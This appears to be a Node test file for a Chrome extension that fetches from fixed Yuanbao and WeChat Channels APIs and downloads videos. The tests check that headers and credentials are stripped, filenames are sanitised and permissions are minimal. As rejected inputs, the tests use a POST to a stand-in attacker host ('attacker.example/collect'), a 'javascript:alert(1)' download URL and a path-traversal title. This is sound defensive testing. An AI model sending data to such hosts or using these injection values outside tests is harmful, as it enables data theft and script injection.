import assert from "node:assert/strict";
import { readFile } from "node:fs/promises";
import test from "node:test";
import {
  createExtensionRequest,
  downloadStatus,
  latestDownload,
  safeFilename,
  startDownload,
} from "../extension/app.mjs";
import { API_URLS } from "../src/core.mjs";

test("extension requests only fixed APIs with isolated credentials and browser-owned headers", async () => {
  const calls = [];
  const request = createExtensionRequest(async (url, init) => {
    calls.push({ url, init });
    return Response.json({ ok: true });
  });

  await request(API_URLS.userInfo, {
    method: "GET",
    headers: {
      Origin: "https://yuanbao.tencent.com",
      Referer: "https://yuanbao.tencent.com/chat?private=value",
      Cookie: "must-not-be-set-by-extension-code",
      Authorization: "must-not-cross-origin",
    },
  });
  assert.equal(calls[0].init.credentials, "include");
  assert.equal(calls[0].init.redirect, "error");
  assert.equal(calls[0].init.headers.has("origin"), false);
  assert.equal(calls[0].init.headers.has("referer"), false);
  assert.equal(calls[0].init.headers.has("cookie"), false);
  assert.equal(calls[0].init.headers.has("authorization"), false);

  await request(`${API_URLS.feedInfo}?_rid=synthetic-rid`, {
    method: "POST",
    credentials: "include",
    headers: { referer: "https://channels.weixin.qq.com/?token=synthetic-token" },
    body: "{}",
  });
  assert.equal(calls[1].init.credentials, "omit");
  assert.equal(calls[1].init.headers.has("referer"), false);
  await assert.rejects(request("https://attacker.example/collect", { method: "POST" }), TypeError);
  await assert.rejects(request(API_URLS.userInfo, { method: "POST" }), TypeError);
  assert.equal(calls.length, 2);
});

test("download filenames are safe and existing files are uniquified", async () => {
  let options;
  const chromeApi = {
    downloads: {
      download: async (value) => {
        options = value;
        return 27;
      },
    },
  };

  const id = await startDownload({
    title: "../clip: one?.mp4",
    downloadUrl: "https://media.example/video.mp4?sig=synthetic-signature",
  }, chromeApi);

  assert.equal(id, 27);
  assert.equal(options.url, "https://media.example/video.mp4?sig=synthetic-signature");
  assert.equal(options.filename, safeFilename("../clip: one?.mp4"));
  assert.equal(options.filename.includes("/"), false);
  assert.equal(options.filename.includes(".."), false);
  assert.equal(options.conflictAction, "uniquify");
  assert.equal("saveAs" in options, false);
  await assert.rejects(
    startDownload({ title: "clip", downloadUrl: "javascript:alert(1)" }, chromeApi),
    TypeError,
  );
});

test("download status survives reopening through Chrome's own recent download history", async () => {
  let query;
  const chromeApi = {
    runtime: { id: "synthetic-extension-id" },
    downloads: {
      search: async (value) => {
        query = value;
        return [
          { byExtensionId: "other-extension", state: "complete", filename: "/tmp/other.mp4" },
          { byExtensionId: "synthetic-extension-id", state: "in_progress", filename: "/tmp/clip.mp4" },
        ];
      },
    },
  };

  const item = await latestDownload(chromeApi);
  assert.deepEqual(query, { orderBy: ["-startTime"], limit: 50 });
  assert.equal(item.filename, "/tmp/clip.mp4");
  assert.equal(downloadStatus(item), "正在下载 · clip.mp4");
  assert.equal(downloadStatus(null), "还没有下载记录。");
});

test("manifest requests only download and upstream-host permissions", async () => {
  const manifest = JSON.parse(await readFile(new URL("../extension/manifest.json", import.meta.url)));
  assert.deepEqual(manifest.permissions, ["downloads"]);
  assert.deepEqual(manifest.host_permissions, [
    "https://yuanbao.tencent.com/*",
    "https://channels.weixin.qq.com/*",
  ]);
  assert.equal(manifest.background.service_worker, "background.mjs");
  assert.equal(manifest.action.default_popup, undefined);
});

test("toolbar action opens the full extension page in a new tab", async () => {
  const previousChrome = globalThis.chrome;
  let onClicked;
  let createdTab;
  globalThis.chrome = {
    action: { onClicked: { addListener: (listener) => { onClicked = listener; } } },
    runtime: { getURL: (path) => `chrome-extension://synthetic-id/${path}` },
    tabs: { create: (properties) => { createdTab = properties; } },
  };

  try {
    await import(`../extension/background.mjs?test=${Date.now()}`);
    onClicked();
    assert.deepEqual(createdTab, { url: "chrome-extension://synthetic-id/index.html" });
  } finally {
    if (previousChrome === undefined) delete globalThis.chrome;
    else globalThis.chrome = previousChrome;
  }
});
